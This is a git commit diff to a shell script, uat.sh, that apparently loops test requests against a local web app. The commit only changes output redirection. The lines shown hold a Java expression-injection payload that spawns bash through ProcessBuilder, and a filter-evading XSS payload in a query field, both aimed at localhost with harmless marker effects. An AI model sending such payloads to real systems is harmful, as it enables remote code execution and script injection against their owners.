ed918d089473e17c770924af976e5afd72b591e8
Robert Statsinger <rstats@pacbell.net>
2018-10-16 11:28:01 -0700

    Update uat.sh

--- uat.sh
+++ uat.sh
@@ -27,13 +27,13 @@ curl -s localhost:3030/patients >/dev/null ;\
 
 sleep 5 ;\
 
-wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()" >&/dev/null ;\
-wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()" >&/dev/null ;\
+wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()" >/dev/null ;\
+wget "localhost:3030/search/user?foo=new java.lang.ProcessBuilder({'/bin/bash','-c','echo 3vilhax0r>/tmp/hacked'}).start()" >/dev/null ;\
 
 sleep 5 ;\
 
-wget "localhost:3030/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432%3Cscriscriptpt%3Ealert(1)%3C/sscriptcript%3E" >&/dev/null ;\
+wget "localhost:3030/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432%3Cscriscriptpt%3Ealert(1)%3C/sscriptcript%3E" >/dev/null ;\
 
-/bin/rm -f ./debug*
+/bin/rm -f ./debug* > /dev/null
 sleep 4 ;\
 done
